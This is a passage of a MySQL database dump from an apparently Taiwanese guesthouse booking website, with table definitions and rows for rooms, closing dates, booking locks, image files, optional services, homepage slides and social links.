(17, 5, 2, 2, 4, 1, '親子同樂4人房(測試)', '雙人2大床', 'family-room-4', '<p>親子同樂4人房(測試)</p><p>親子同樂4人房(測試)</p><p>親子同樂4人房(測試)</p><p>親子同樂4人房(測試)</p>', '1,2', 1, 5000, 1, 2, 15, NULL, NULL);

-- --------------------------------------------------------

--
-- 資料表結構 `pm_room_calendar`
--

CREATE TABLE `pm_room_calendar` (
  `id` int(11) NOT NULL,
  `id_room` int(11) NOT NULL,
  `title` varchar(150) DEFAULT NULL,
  `latest_sync` int(11) DEFAULT NULL,
  `url` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

-- --------------------------------------------------------

--
-- 資料表結構 `pm_room_closing`
--

CREATE TABLE `pm_room_closing` (
  `id` int(11) NOT NULL,
  `id_room` int(11) NOT NULL,
  `from_date` int(11) DEFAULT NULL,
  `to_date` int(11) DEFAULT NULL,
  `stock` int(11) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_room_closing`
--

INSERT INTO `pm_room_closing` (`id`, `id_room`, `from_date`, `to_date`, `stock`) VALUES
(2, 11, 1674345600, 1674864000, 1),
(3, 16, 1672531200, 1682899200, 1),
(5, 13, 1672531200, 1682899200, 2),
(6, 14, 1672531200, 1682899200, 2),
(7, 15, 1663718400, 1663804800, 2),
(10, 12, 1672617600, 1682899200, 1),
(24, 11, 1685577600, 1703980800, 1),
(33, 11, 1677196800, 1677456000, 1);

-- --------------------------------------------------------

--
-- 資料表結構 `pm_room_file`
--

CREATE TABLE `pm_room_file` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `id_item` int(11) NOT NULL,
  `home` int(11) DEFAULT 0,
  `checked` int(11) DEFAULT 1,
  `rank` int(11) DEFAULT 0,
  `file` varchar(250) DEFAULT NULL,
  `label` varchar(250) DEFAULT NULL,
  `type` varchar(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_room_file`
--

INSERT INTO `pm_room_file` (`id`, `lang`, `id_item`, `home`, `checked`, `rank`, `file`, `label`, `type`) VALUES
(4, 1, 1, NULL, 1, 1, '7.jpg', '', 'image'),
(4, 2, 1, NULL, 1, 1, '7.jpg', 'setr', 'image'),
(4, 3, 1, NULL, 1, 1, '7.jpg', '', 'image'),
(4, 5, 1, NULL, 1, 1, '7.jpg', 'setr', 'image'),
(5, 1, 1, NULL, 1, 2, '4.jpg', '', 'image'),
(5, 2, 1, NULL, 1, 2, '4.jpg', '', 'image'),
(5, 3, 1, NULL, 1, 2, '4.jpg', '', 'image'),
(5, 5, 1, NULL, 1, 2, '4.jpg', '', 'image'),
(6, 1, 4, NULL, 1, 6, 'img-2945.jpg', '', 'image'),
(6, 2, 4, NULL, 1, 6, 'img-2945.jpg', '', 'image'),
(6, 3, 4, NULL, 1, 6, 'img-2945.jpg', '', 'image'),
(6, 5, 4, NULL, 1, 6, 'img-2945.jpg', '', 'image'),
(7, 1, 4, NULL, 1, 7, 'img-2954.jpg', '', 'image'),
(7, 2, 4, NULL, 1, 7, 'img-2954.jpg', '', 'image'),
(7, 3, 4, NULL, 1, 7, 'img-2954.jpg', '', 'image'),
(7, 5, 4, NULL, 1, 7, 'img-2954.jpg', '', 'image'),
(8, 1, 4, NULL, 1, 8, 'img-2955.jpg', '', 'image'),
(8, 2, 4, NULL, 1, 8, 'img-2955.jpg', '', 'image'),
(8, 3, 4, NULL, 1, 8, 'img-2955.jpg', '', 'image'),
(8, 5, 4, NULL, 1, 8, 'img-2955.jpg', '', 'image'),
(9, 1, 4, NULL, 1, 9, 'img-2956.jpg', '', 'image'),
(9, 2, 4, NULL, 1, 9, 'img-2956.jpg', '', 'image'),
(9, 3, 4, NULL, 1, 9, 'img-2956.jpg', '', 'image'),
(9, 5, 4, NULL, 1, 9, 'img-2956.jpg', '', 'image'),
(10, 1, 4, NULL, 1, 10, '28.jpg', '', 'image'),
(10, 2, 4, NULL, 1, 10, '28.jpg', '', 'image'),
(10, 3, 4, NULL, 1, 10, '28.jpg', '', 'image'),
(10, 5, 4, NULL, 1, 10, '28.jpg', '', 'image'),
(11, 1, 4, NULL, 1, 11, '29.jpg', '', 'image'),
(11, 2, 4, NULL, 1, 11, '29.jpg', '', 'image'),
(11, 3, 4, NULL, 1, 11, '29.jpg', '', 'image'),
(11, 5, 4, NULL, 1, 11, '29.jpg', '', 'image'),
(12, 1, 5, NULL, 1, 12, 'img-3728.jpg', '', 'image'),
(12, 2, 5, NULL, 1, 12, 'img-3728.jpg', '', 'image'),
(12, 3, 5, NULL, 1, 12, 'img-3728.jpg', '', 'image'),
(12, 5, 5, NULL, 1, 12, 'img-3728.jpg', '', 'image'),
(13, 1, 5, NULL, 1, 13, 'img-3729.jpg', '', 'image'),
(13, 2, 5, NULL, 1, 13, 'img-3729.jpg', '', 'image'),
(13, 3, 5, NULL, 1, 13, 'img-3729.jpg', '', 'image'),
(13, 5, 5, NULL, 1, 13, 'img-3729.jpg', '', 'image'),
(14, 1, 6, NULL, 1, 14, 'img-3734.jpg', '', 'image'),
(14, 2, 6, NULL, 1, 14, 'img-3734.jpg', '', 'image'),
(14, 3, 6, NULL, 1, 14, 'img-3734.jpg', '', 'image'),
(14, 5, 6, NULL, 1, 14, 'img-3734.jpg', '', 'image'),
(15, 1, 6, NULL, 1, 15, 'img-3733.jpg', '', 'image'),
(15, 2, 6, NULL, 1, 15, 'img-3733.jpg', '', 'image'),
(15, 3, 6, NULL, 1, 15, 'img-3733.jpg', '', 'image'),
(15, 5, 6, NULL, 1, 15, 'img-3733.jpg', '', 'image'),
(16, 1, 7, NULL, 1, 1, 'img-3720.jpg', '', 'image'),
(16, 2, 7, NULL, 1, 1, 'img-3720.jpg', '', 'image'),
(16, 3, 7, NULL, 1, 1, 'img-3720.jpg', '', 'image'),
(16, 5, 7, NULL, 1, 1, 'img-3720.jpg', '', 'image'),
(18, 1, 8, NULL, 1, 18, '02-2.jpg', '', 'image'),
(18, 2, 8, NULL, 1, 18, '02-2.jpg', '', 'image'),
(18, 3, 8, NULL, 1, 18, '02-2.jpg', '', 'image'),
(18, 5, 8, NULL, 1, 18, '02-2.jpg', '', 'image'),
(24, 2, 9, NULL, 1, 2, 's-35848219.jpg', '', 'image'),
(24, 5, 9, NULL, 1, 2, 's-35848219.jpg', '', 'image'),
(26, 2, 9, NULL, 1, 4, 's-35848216.jpg', '', 'image'),
(26, 5, 9, NULL, 1, 4, 's-35848216.jpg', '', 'image'),
(27, 2, 10, NULL, 1, 2, 's-35848230.jpg', '', 'image'),
(27, 5, 10, NULL, 1, 2, 's-35848230.jpg', '', 'image'),
(28, 2, 10, NULL, 1, 3, 's-35848229.jpg', '', 'image'),
(28, 5, 10, NULL, 1, 3, 's-35848229.jpg', '', 'image'),
(29, 2, 10, NULL, 1, 4, 's-35848227.jpg', '', 'image'),
(29, 5, 10, NULL, 1, 4, 's-35848227.jpg', '', 'image'),
(30, 2, 11, NULL, 1, 1, 's-35848223.jpg', '', 'image'),
(30, 5, 11, NULL, 1, 1, 's-35848223.jpg', '', 'image'),
(31, 2, 11, NULL, 1, 20, 's-35848222.jpg', '', 'image'),
(31, 5, 11, NULL, 1, 20, 's-35848222.jpg', '', 'image'),
(32, 2, 11, NULL, 1, 21, 's-35848225.jpg', '', 'image'),
(32, 5, 11, NULL, 1, 21, 's-35848225.jpg', '', 'image'),
(33, 2, 7, NULL, 1, 22, 's-37306375.jpg', '', 'image'),
(33, 5, 7, NULL, 1, 22, 's-37306375.jpg', '', 'image'),
(47, 2, 10, NULL, 1, 2, 's-35848228.jpg', '', 'image'),
(47, 5, 10, NULL, 1, 2, 's-35848228.jpg', '', 'image'),
(48, 2, 10, NULL, 1, 3, 's-35848229.jpg', '', 'image'),
(48, 5, 10, NULL, 1, 3, 's-35848229.jpg', '', 'image'),
(49, 2, 10, NULL, 1, 4, 's-35848227.jpg', '', 'image'),
(49, 5, 10, NULL, 1, 4, 's-35848227.jpg', '', 'image'),
(50, 2, 11, NULL, 1, 3, 's-35848225.jpg', '', 'image'),
(50, 5, 11, NULL, 1, 3, 's-35848225.jpg', '', 'image'),
(51, 2, 11, NULL, 1, 2, 's-35848222.jpg', '', 'image'),
(51, 5, 11, NULL, 1, 2, 's-35848222.jpg', '', 'image'),
(52, 2, 11, NULL, 1, 4, 's-35848223.jpg', '', 'image'),
(52, 5, 11, NULL, 1, 4, 's-35848223.jpg', '', 'image'),
(55, 2, 12, NULL, 1, 2, 's-35848218.jpg', '', 'image'),
(55, 5, 12, NULL, 1, 2, 's-35848218.jpg', '', 'image'),
(56, 2, 12, NULL, 1, 3, 's-35848219.jpg', '', 'image'),
(56, 5, 12, NULL, 1, 3, 's-35848219.jpg', '', 'image'),
(57, 2, 12, NULL, 1, 1, 's-35848214fix.jpg', '', 'image'),
(57, 5, 12, NULL, 1, 1, 's-35848214fix.jpg', '', 'image'),
(58, 2, 9, NULL, 1, 1, 's-35848216.jpg', '', 'image'),
(58, 5, 9, NULL, 1, 1, 's-35848216.jpg', '', 'image'),
(59, 2, 9, NULL, 1, 2, 's-35848219.jpg', '', 'image'),
(59, 5, 9, NULL, 1, 2, 's-35848219.jpg', '', 'image'),
(60, 2, 9, NULL, 1, 3, 's-35848217.jpg', '', 'image'),
(60, 5, 9, NULL, 1, 3, 's-35848217.jpg', '', 'image'),
(61, 2, 9, NULL, 1, 4, 's-35848220.jpg', '', 'image'),
(61, 5, 9, NULL, 1, 4, 's-35848220.jpg', '', 'image'),
(62, 2, 9, NULL, 1, 5, 's-35848215.jpg', '', 'image'),
(62, 5, 9, NULL, 1, 5, 's-35848215.jpg', '', 'image'),
(63, 2, 9, NULL, 1, 6, 's-35848218.jpg', '', 'image'),
(63, 5, 9, NULL, 1, 6, 's-35848218.jpg', '', 'image'),
(64, 2, 17, NULL, 1, 23, '0bf6azron13nrplxc7s6bua38urbuuiwch7fn3lg.png', NULL, 'image'),
(64, 5, 17, NULL, 1, 23, '0bf6azron13nrplxc7s6bua38urbuuiwch7fn3lg.png', NULL, 'image'),
(65, 2, 7, NULL, 1, 24, 's-35266757.jpg', '', 'image'),
(65, 5, 7, NULL, 1, 24, 's-35266757.jpg', '', 'image'),
(66, 2, 7, NULL, 1, 25, 's-35266760.jpg', '', 'image'),
(66, 5, 7, NULL, 1, 25, 's-35266760.jpg', '', 'image');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_room_lock`
--

CREATE TABLE `pm_room_lock` (
  `id` int(11) NOT NULL,
  `id_room` int(11) DEFAULT NULL,
  `from_date` int(11) DEFAULT NULL,
  `to_date` int(11) DEFAULT NULL,
  `add_date` int(11) DEFAULT NULL,
  `sessid` varchar(50) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_room_lock`
--

INSERT INTO `pm_room_lock` (`id`, `id_room`, `from_date`, `to_date`, `add_date`, `sessid`) VALUES
(53, 11, 1668816000, 1668902400, 1667122380, '635e44ccd9684'),
(158, 11, 1679011200, 1679184000, 1674027855, '63c7a34fda2fc'),
(162, 11, 1674864000, 1675036800, 1674268050, '63cb4d92f1dcf'),
(164, 11, 1675728000, 1675987200, 1674627185, '63d0c8712a515'),
(169, 11, 1675382400, 1675468800, 1675241455, '63da27ef38edc'),
(193, 11, 1677456000, 1677542400, 1677158490, '63f7685a0fcd5'),
(197, 11, 1680393600, 1680480000, 1677900847, '6402bc2f41f9b'),
(211, 11, 1679184000, 1679270400, 1679037431, '641413f7cd440'),
(231, 11, 1683244800, 1683331200, 1679904556, '64214f2cb0867'),
(233, 11, 1684195200, 1684281600, 1679911323, '6421699ba4d06'),
(234, 11, 1683763200, 1683849600, 1679911580, '64216a9cb7671'),
(235, 11, 1683676800, 1683763200, 1679912916, '64216fd40fca9'),
(236, 11, 1680048000, 1680134400, 1679913578, '6421726a6aff9'),
(237, 11, 1683331200, 1683417600, 1679931237, '6421b765353c1'),
(239, 11, 1684368000, 1684454400, 1679990867, '6422a053b0955'),
(241, 11, 1681257600, 1681344000, 1680230164, '64264714db49e'),
(242, 11, 1682726400, 1682812800, 1680250570, '642696ca6c25a'),
(243, 11, 1682726400, 1682812800, 1680755141, '642e49c5a3ea1'),
(244, 1, 1682208000, 1682294400, 1681293082, '64367f1a3d62f'),
(245, 9, 1681516800, 1681603200, 1681352969, '64376909172ee'),
(246, 4, 1682640000, 1682726400, 1681521434, '6439fb1a72f88'),
(248, 1, 1682467200, 1682553600, 1681784075, '643dfd0b1a9e2'),
(249, 5, 1682812800, 1682899200, 1681957512, '6440a288c9711'),
(252, 11, 1682812800, 1682985600, 1682188474, '644428ba0c73f'),
(255, 4, 1683849600, 1683936000, 1683367926, '645627f63822a'),
(257, 5, 1683936000, 1684022400, 1683793561, '645ca699b9713'),
(258, 1, 1684713600, 1684800000, 1683816744, '645d01282f965'),
(260, 4, 1689120000, 1689206400, 1683955760, '645f20309a328'),
(265, 7, 1689984000, 1690070400, 1684203301, '6462e7258e694'),
(266, 10, 1687392000, 1687651200, 1684307146, '64647ccad6dcf'),
(270, 4, 1685145600, 1685232000, 1684375165, '6465867d52e7b'),
(271, 5, 1685145600, 1685232000, 1684375165, '6465867d52e7b'),
(273, 8, 1685145600, 1685232000, 1684375578, '6465881a7aa8a'),
(274, 1, 1684540800, 1684627200, 1684414766, '6466212e6bbc1'),
(276, 1, 1687392000, 1687564800, 1684639466, '64698eea00974'),
(277, 5, 1687046400, 1687132800, 1684813449, '646c36899a27c'),
(281, 1, 1688774400, 1688860800, 1685627660, '6478a30c984d4'),
(282, 1, 1688169600, 1688256000, 1685630367, '6478ad9f27f4c'),
(284, 8, 1688947200, 1689033600, 1685693290, '6479a36aa7e72'),
(291, 10, 1689379200, 1689465600, 1685896474, '647cbd1a45a4f'),
(292, 1, 1689379200, 1689465600, 1685896474, '647cbd1a45a4f'),
(293, 1, 1689379200, 1689465600, 1685896474, '647cbd1a45a4f'),
(294, 5, 1689379200, 1689465600, 1685896474, '647cbd1a45a4f'),
(312, 9, 1691798400, 1691884800, 1686552201, '6486be8942e14'),
(313, 1, 1687478400, 1687564800, 1686582106, '6487335ae9314'),
(315, 1, 1687478400, 1687564800, 1686583115, '6487374b22b3b'),
(316, 1, 1687478400, 1687564800, 1686639241, '64881289130e8'),
(317, 1, 1691193600, 1691280000, 1686901141, '648c1195be79d'),
(320, 6, 1687392000, 1687478400, 1687175746, '6490424235ebd'),
(322, 10, 1688774400, 1688860800, 1687279047, '6491d5c7f0085'),
(323, 7, 1691798400, 1691884800, 1687404626, '6493c0527dab3'),
(325, 4, 1691193600, 1691280000, 1687413612, '6493e36c47a31'),
(326, 4, 1689120000, 1689206400, 1687695644, '6498311cbbe0d'),
(332, 5, 1688774400, 1688860800, 1687861455, '649ab8cf3c6d7'),
(337, 8, 1688947200, 1689292800, 1687964419, '649c4b03a842f'),
(339, 4, 1688169600, 1688256000, 1687999541, '649cd4357c739'),
(340, 4, 1688256000, 1688342400, 1688010333, '649cfe5d3920f'),
(341, 4, 1688256000, 1688342400, 1688010372, '649cfe84afa09'),
(348, 1, 1690588800, 1690761600, 1688234353, '64a06971f17eb'),
(352, 1, 1690588800, 1690761600, 1688357519, '64a24a8fee8c6'),
(358, 1, 1690588800, 1690761600, 1688446959, '64a3a7ef589fa'),
(361, 4, 1689379200, 1689465600, 1688466732, '64a3f52c6c631'),
(363, 4, 1690934400, 1691020800, 1688535967, '64a5039fe0fce'),
(364, 8, 1690934400, 1691020800, 1688535967, '64a5039fe0fce'),
(365, 1, 1692403200, 1692489600, 1688547422, '64a5305e2b4cc'),
(371, 1, 1689897600, 1690070400, 1688715316, '64a7c03416a27'),
(374, 1, 1689638400, 1689984000, 1688738224, '64a819b052463'),
(375, 1, 1689638400, 1689984000, 1688738224, '64a819b052463'),
(385, 7, 1689292800, 1689465600, 1688908111, '64aab14fcdf91'),
(386, 7, 1689292800, 1689465600, 1688908137, '64aab16900550'),
(387, 7, 1689292800, 1689465600, 1688910121, '64aab929ae459'),
(389, 1, 1691193600, 1691280000, 1689069363, '64ad27331d7f6'),
(390, 8, 1689206400, 1689638400, 1689090526, '64ad79dee9f40'),
(391, 5, 1691193600, 1691280000, 1689125175, '64ae0137b57cd'),
(393, 4, 1689379200, 1689638400, 1689130282, '64ae152a703f5'),
(394, 1, 1692144000, 1692230400, 1689136671, '64ae2e1f31c07'),
(396, 6, 1689379200, 1689465600, 1689177669, '64aece4556190'),
(399, 4, 1691625600, 1691712000, 1689233733, '64afa9455c5d6'),
(400, 7, 1689984000, 1690070400, 1689306469, '64b0c56510d07'),
(403, 6, 1691107200, 1691280000, 1689341757, '64b14f3d1b25a'),
(406, 4, 1691366400, 1691452800, 1689416400, '64b272d045dfd'),
(412, 1, 1689984000, 1690070400, 1689661979, '64b6321bf00a4'),
(419, 4, 1692835200, 1693094400, 1689776811, '64b7f2ab60be1'),
(421, 8, 1692144000, 1692316800, 1689826501, '64b8b4c59548b'),
(423, 8, 1690329600, 1690502400, 1689828701, '64b8bd5dc7168'),
(428, 7, 1690070400, 1690156800, 1689933539, '64ba56e37f5d1'),
(430, 8, 1690156800, 1690243200, 1690181957, '64be2145b3226'),
(431, 9, 1690156800, 1690243200, 1690181958, '64be214640c9e'),
(432, 8, 1690156800, 1690243200, 1690181958, '64be2146b6397'),
(433, 9, 1690156800, 1690243200, 1690181959, '64be214741907'),
(434, 8, 1690156800, 1690243200, 1690182611, '64be23d30f9f1'),
(435, 8, 1690156800, 1690243200, 1690182612, '64be23d4332af'),
(436, 8, 1690156800, 1690243200, 1690182753, '64be2461dd45b'),
(437, 8, 1690156800, 1690243200, 1690182754, '64be246261909'),
(438, 1, 1691193600, 1691366400, 1690291603, '64bfcd9337a62'),
(441, 1, 1692403200, 1692489600, 1690465127, '64c2736763888'),
(442, 1, 1692403200, 1692489600, 1690465127, '64c2736763888'),
(447, 6, 1691193600, 1691280000, 1690626422, '64c4e976810cc'),
(450, 6, 1691625600, 1691712000, 1690773779, '64c729137b44a'),
(452, 5, 1692403200, 1692662400, 1690878773, '64c8c335ea37c'),
(458, 5, 1691798400, 1691884800, 1690961896, '64ca07e87bc49'),
(459, 1, 1691193600, 1691280000, 1691027368, '64cb07a8852e8'),
(461, 4, 1691193600, 1691366400, 1691103186, '64cc2fd281a47'),
(467, 6, 1691884800, 1691971200, 1691387624, '64d086e802587'),
(468, 7, 1693008000, 1693094400, 1691462210, '64d1aa420b4f6'),
(472, 1, 1693008000, 1693094400, 1691636758, '64d4541632fc5'),
(473, 4, 1693008000, 1693094400, 1691636758, '64d4541632fc5'),
(474, 4, 1691798400, 1691884800, 1691662212, '64d4b78477e28'),
(475, 4, 1691798400, 1691884800, 1691662212, '64d4b78477e28'),
(480, 1, 1692662400, 1692921600, 1691682149, '64d505650abd2'),
(481, 1, 1692230400, 1692316800, 1691731989, '64d5c815a6d26'),
(482, 5, 1692230400, 1692316800, 1691731989, '64d5c815a6d26'),
(486, 8, 1692662400, 1692748800, 1691840701, '64d770bdc787c'),
(487, 4, 1692489600, 1692576000, 1691898671, '64d8532fe85d4'),
(488, 10, 1692403200, 1692489600, 1692064900, '64dadc84bf0a1'),
(492, 4, 1692403200, 1692489600, 1692111178, '64db914aa0e8d'),
(493, 7, 1692489600, 1692576000, 1692113185, '64db99213c5c2'),
(494, 8, 1692489600, 1692576000, 1692166616, '64dc69d860651'),
(496, 6, 1692835200, 1692921600, 1692241601, '64dd8ec1753bb'),
(497, 8, 1693180800, 1693440000, 1692252167, '64ddb8072d2a5'),
(498, 8, 1693094400, 1693180800, 1692624685, '64e3672d9a5eb'),
(501, 8, 1693526400, 1693612800, 1693406120, '64ef53a8d3423'),
(504, 1, 1694822400, 1694995200, 1694161690, '64fadb1a268a3'),
(505, 1, 1694822400, 1694995200, 1694162441, '64fade09526f6'),
(510, 6, 1695945600, 1696032000, 1694440860, '64ff1d9c81e19'),
(512, 1, 1695945600, 1696032000, 1694443691, '64ff28ab209c7'),
(515, 1, 1695859200, 1695945600, 1695686331, '65121ebb005f5');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_service`
--

CREATE TABLE `pm_service` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `title` varchar(250) DEFAULT NULL,
  `descr` text DEFAULT NULL,
  `long_descr` text DEFAULT NULL,
  `type` varchar(50) DEFAULT NULL,
  `rooms` varchar(250) DEFAULT NULL,
  `price` double DEFAULT NULL,
  `id_tax` int(11) DEFAULT NULL,
  `taxes` text DEFAULT NULL,
  `mandatory` int(11) DEFAULT 0,
  `start_date` int(11) DEFAULT NULL,
  `end_date` int(11) DEFAULT NULL,
  `checked` int(11) DEFAULT 0,
  `rank` int(11) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_service`
--

INSERT INTO `pm_service` (`id`, `lang`, `title`, `descr`, `long_descr`, `type`, `rooms`, `price`, `id_tax`, `taxes`, `mandatory`, `start_date`, `end_date`, `checked`, `rank`) VALUES
(1, 1, 'Set de toilette', '1 serviette de toilette, 1 drap de douche, 1 tapis', '', 'qty-night', '4,1,3,2', 7, 1, '', 0, NULL, NULL, 1, 1),
(1, 2, 'Rent of towel (kit)', '1 hand towel, 1 bath towel, 1 bath mat', '', 'qty-night', '4,1,3,2', 7, 1, '', 0, NULL, NULL, 1, 1),
(1, 3, 'Rent of towel (kit)', '1 hand towel, 1 bath towel, 1 bath mat', '', 'qty-night', '4,1,3,2', 7, 1, '', 0, NULL, NULL, 1, 1),
(1, 5, 'Rent of towel (kit)', '1 hand towel, 1 bath towel, 1 bath mat', '', 'qty-night', '4,1,3,2', 7, 1, '', 0, NULL, NULL, 1, 1),
(2, 1, 'Ménage', '', '', 'package', '1,3,2', 50, 1, '', 0, NULL, NULL, 1, 2),
(2, 2, 'Housework', '', '', 'package', '1,3,2', 50, 1, '', 0, NULL, NULL, 1, 2),
(2, 3, 'Housework', '', '', 'package', '1,3,2', 50, 1, '', 0, NULL, NULL, 1, 2),
(2, 5, 'Housework', '', '', 'package', '1,3,2', 50, 1, '', 0, NULL, NULL, 1, 2),
(3, 1, 'Chauffage', '', '', 'night', '1,3,2', 8, 1, '', 0, NULL, NULL, 1, 3),
(3, 2, 'Heating', '', '', 'night', '1,3,2', 8, 1, '', 0, NULL, NULL, 1, 3),
(3, 3, 'Heating', '', '', 'night', '1,3,2', 8, 1, '', 0, NULL, NULL, 1, 3),
(3, 5, 'Heating', '', '', 'night', '1,3,2', 8, 1, '', 0, NULL, NULL, 1, 3),
(4, 1, 'Animal domestique', 'Précisez la race ci-dessous', '', 'qty-night', '4,1,3,2', 5, 1, '', 0, NULL, NULL, 1, 4),
(4, 2, 'Pet', 'Specify the breed below', '', 'qty-night', '4,1,3,2', 5, 1, '', 0, NULL, NULL, 1, 4),
(4, 3, 'Pet', 'Specify the breed below', '', 'qty-night', '4,1,3,2', 5, 1, '', 0, NULL, NULL, 1, 4),
(4, 5, 'Pet', 'Specify the breed below', '', 'qty-night', '4,1,3,2', 5, 1, '', 0, NULL, NULL, 1, 4);

-- --------------------------------------------------------

--
-- 資料表結構 `pm_slide`
--

CREATE TABLE `pm_slide` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `legend` text DEFAULT NULL,
  `url` varchar(250) DEFAULT NULL,
  `id_page` int(11) DEFAULT NULL,
  `checked` int(11) DEFAULT 0,
  `rank` int(11) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_slide`
--

INSERT INTO `pm_slide` (`id`, `lang`, `legend`, `url`, `id_page`, `checked`, `rank`) VALUES
(8, 1, '', '', 1, 1, 1),
(8, 2, '', '', 1, 1, 1),
(8, 3, '', '', 1, 1, 1),
(8, 5, '', '', 1, 1, 1),
(9, 1, '', '', 1, 1, 2),
(9, 2, '', '', 1, 1, 2),
(9, 3, '', '', 1, 1, 2),
(9, 5, '', '', 1, 1, 2),
(14, 1, '', '', 1, 2, 3),
(14, 2, '<p>從會館房間往後看的夕陽</p>', '', 1, 2, 3),
(14, 3, '', '', 1, 2, 3),
(14, 5, '<p>從會館房間往後看的夕陽</p>', '', 1, 2, 3),
(17, 1, '', '', 1, 2, 4),
(17, 2, '<p>水電蔡坤龍攝-熱氣球活動</p>', '', 1, 2, 4),
(17, 3, '', '', 1, 2, 4),
(17, 5, '<p>水電蔡坤龍攝-熱氣球活動</p>', '', 1, 2, 4),
(19, 2, '', '', 2, 1, 5),
(19, 5, '', '', 2, 1, 5),
(22, 2, '<p>社區友善旅店</p>', '', 1, 1, 6),
(22, 5, '<p>社區友善旅店</p>', '', 1, 1, 6),
(28, 2, '<p>寵物友善旅店</p>', '', 1, 1, 7),
(28, 5, '<p>寵物友善旅店</p>', '', 1, 1, 7),
(29, 2, '<p>單車友善旅店</p>', '', 1, 1, 8),
(29, 5, '<p>單車友善旅店</p>', '', 1, 1, 8),
(30, 2, '<p>樂齡友善旅店</p>', '', 1, 1, 9),
(30, 5, '<p>樂齡友善旅店</p>', '', 1, 1, 9),
(31, 2, '<p>LGBTQ友善旅店</p>', '', 1, 1, 10),
(31, 5, '<p>LGBTQ友善旅店</p>', '', 1, 1, 10),
(32, 2, '<p>地球永續友善旅店</p>', '', 1, 1, 11),
(32, 5, '<p>地球永續友善旅店</p>', '', 1, 1, 11);

-- --------------------------------------------------------

--
-- 資料表結構 `pm_slide_file`
--

CREATE TABLE `pm_slide_file` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `id_item` int(11) NOT NULL,
  `home` int(11) DEFAULT 0,
  `checked` int(11) DEFAULT 1,
  `rank` int(11) DEFAULT 0,
  `file` varchar(250) DEFAULT NULL,
  `label` varchar(250) DEFAULT NULL,
  `type` varchar(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_slide_file`
--

INSERT INTO `pm_slide_file` (`id`, `lang`, `id_item`, `home`, `checked`, `rank`, `file`, `label`, `type`) VALUES
(8, 1, 8, NULL, 1, 9, 'img-s104-1.jpg', NULL, 'image'),
(8, 2, 8, NULL, 1, 9, 'img-s104-1.jpg', NULL, 'image'),
(8, 3, 8, NULL, 1, 9, 'img-s104-1.jpg', NULL, 'image'),
(8, 5, 8, NULL, 1, 9, 'img-s104-1.jpg', NULL, 'image'),
(9, 1, 9, NULL, 1, 10, '20200712-211011.jpg', NULL, 'image'),
(9, 2, 9, NULL, 1, 10, '20200712-211011.jpg', '', 'image'),
(9, 3, 9, NULL, 1, 10, '20200712-211011.jpg', NULL, 'image'),
(9, 5, 9, NULL, 1, 10, '20200712-211011.jpg', '', 'image'),
(14, 1, 14, NULL, 1, 14, 's-6889512.jpg', NULL, 'image'),
(14, 2, 14, NULL, 1, 14, 's-6889512.jpg', NULL, 'image'),
(14, 3, 14, NULL, 1, 14, 's-6889512.jpg', NULL, 'image'),
(14, 5, 14, NULL, 1, 14, 's-6889512.jpg', NULL, 'image'),
(17, 1, 17, NULL, 1, 17, 's-6889511.jpg', NULL, 'image'),
(17, 2, 17, NULL, 1, 17, 's-6889511.jpg', NULL, 'image'),
(17, 3, 17, NULL, 1, 17, 's-6889511.jpg', NULL, 'image'),
(17, 5, 17, NULL, 1, 17, 's-6889511.jpg', NULL, 'image'),
(18, 2, 19, NULL, 1, 18, '7860589554-c625faa965-o.jpg', '', 'image'),
(18, 5, 19, NULL, 1, 18, '7860589554-c625faa965-o.jpg', '', 'image'),
(19, 2, 22, NULL, 1, 19, '.png', '', 'image'),
(19, 5, 22, NULL, 1, 19, '.png', '', 'image'),
(22, 2, 28, NULL, 1, 20, '3.png', NULL, 'image'),
(22, 5, 28, NULL, 1, 20, '3.png', NULL, 'image'),
(23, 2, 29, NULL, 1, 21, '4.png', NULL, 'image'),
(23, 5, 29, NULL, 1, 21, '4.png', NULL, 'image'),
(24, 2, 30, NULL, 1, 22, 'aged-friendly.png', NULL, 'image'),
(24, 5, 30, NULL, 1, 22, 'aged-friendly.png', NULL, 'image'),
(25, 2, 31, NULL, 1, 23, 'lgbtq-friendly.png', NULL, 'image'),
(25, 5, 31, NULL, 1, 23, 'lgbtq-friendly.png', NULL, 'image'),
(26, 2, 32, NULL, 1, 24, '.png', NULL, 'image'),
(26, 5, 32, NULL, 1, 24, '.png', NULL, 'image');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_social`
--

CREATE TABLE `pm_social` (
  `id` int(11) NOT NULL,
  `type` varchar(50) DEFAULT NULL,
  `url` text DEFAULT NULL,
  `checked` int(11) DEFAULT 1,
  `rank` int(11) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_social`
--

INSERT INTO `pm_social` (`id`, `type`, `url`, `checked`, `rank`) VALUES
(1, 'facebook', 'https://www.facebook.com/%E6%84%9B%E9%A6%A8%E6%9C%83%E9%A4%A8-130301367045264/', 1, 1),
(2, 'youtube', 'https://www.youtube.com/', 0, 2);

-- --------------------------------------------------------

--
-- 資料表結構 `pm_tag`
--

CREATE TABLE `pm_tag` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `value` varchar(250) DEFAULT NULL,
  `pages` varchar(250) DEFAULT NULL,
  `checked` int(11) DEFAULT 0,
  `rank` int(11) DEFAULT 0
